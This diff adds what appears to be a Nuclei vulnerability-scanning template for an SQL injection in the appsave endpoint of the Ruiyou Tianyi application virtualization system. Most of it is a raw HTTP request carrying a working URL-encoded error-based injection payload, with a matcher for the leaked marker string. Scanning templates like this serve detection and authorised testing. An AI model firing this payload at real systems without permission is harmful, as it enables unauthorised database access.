@@ -1,0 +1,26 @@
+id: ruiyou_appsave_sqli
+
+info:
+  name: ruiyou_appsave_sqli
+  author: xiaokp7
+  severity: high
+  description: 瑞友天翼应用虚拟化系统appsave存在SQL注入漏洞
+
+
+
+http:
+  - raw:
+      - |
+        GET /index.php?s=/Admin/appsave&appid=3%27%29+AND+%28SELECT+2590+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%280x716a766a71%2C%28SELECT+%28ELT%282590%3D2590%2C1%29%29%29%2C0x7162786271%2CFLOOR%28RAND%280%29%2A2%29%29x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x%29a%29--+ITBH HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Izntel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Cookie: think_language=zh-CN; PHPSESSID=qlg6b8j8gnd7lbu535e1h3rd02
+        Upgrade-Insecure-Requests: 1
+    matchers:
+      - type: dsl
+        dsl:
+        - 'contains_all(body,"qjvjq1qbxbq1")'
